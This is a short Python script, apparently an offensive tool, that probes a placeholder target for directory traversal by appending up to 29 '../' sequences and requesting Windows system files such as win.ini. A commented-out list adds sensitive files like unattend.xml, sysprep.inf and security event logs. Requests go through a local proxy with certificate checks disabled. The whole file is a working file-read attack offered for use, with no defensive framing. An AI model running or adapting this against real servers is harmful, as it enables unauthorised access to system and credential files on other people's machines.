import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


proxy = {"https":"http://127.0.0.1:8080"}

headers={
'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0'
}


'''
files = ['WINDOWS/system32/drivers/etc/hosts', 'WINDOWS/system32/win.ini', 'WINDOWS/system32/debug/NetSetup.log', 'WINDOWS/system32/config/AppEvent.Evt', 'WINDOWS/system32/config/SecEvent.Evt', 'WINDOWS/Panther/unattend.txt', 'WINDOWS/Panther/unattend.xml', 'WINDOWS/Panther/unattended.xml', 'WINDOWS/Panther/sysprep.inf']
'''
targets=['http://sometarget.com']

files= ['WINDOWS/system32/win.ini']
print("[+] starting...")
for target in targets:
	for file in files:
		url=target
		for i in range(1,30):
			print('[+] Trying #%s.....'%i)
			url+="../"
			r=requests.post(url+file,proxies=proxy,verify=False,allow_redirects=False,headers=headers)
		


### 0x10w1eve1 ###


